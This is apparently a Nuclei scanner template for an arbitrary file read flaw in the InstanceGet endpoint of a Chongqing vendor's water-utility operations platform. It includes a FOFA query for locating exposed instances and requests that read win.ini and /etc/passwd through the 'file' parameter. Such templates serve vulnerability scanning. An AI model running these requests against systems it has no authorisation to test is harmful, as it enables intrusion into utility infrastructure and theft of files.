id: sntsoft-water-instanceget-fileread
info:
  name: 森鑫炬水务企业综合运营平台 InstanceGet 存在任意文件读取
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%A3%AE%E9%91%AB%E7%82%AC%E6%B0%B4%E5%8A%A1%E4%BC%81%E4%B8%9A%E7%BB%BC%E5%90%88%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0/%E6%A3%AE%E9%91%AB%E7%82%AC%E6%B0%B4%E5%8A%A1%E4%BC%81%E4%B8%9A%E7%BB%BC%E5%90%88%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0%20InstanceGet%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
    tips:
    repair:
    version:
  tags: fileread,sntsoft

http:
  - method: GET
    path:
      - "{{BaseURL}}/Forms/Instance/Get?file=C:/Windows/win.ini"
      - "{{BaseURL}}/Forms/Instance/Get?file=/etc/passwd"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200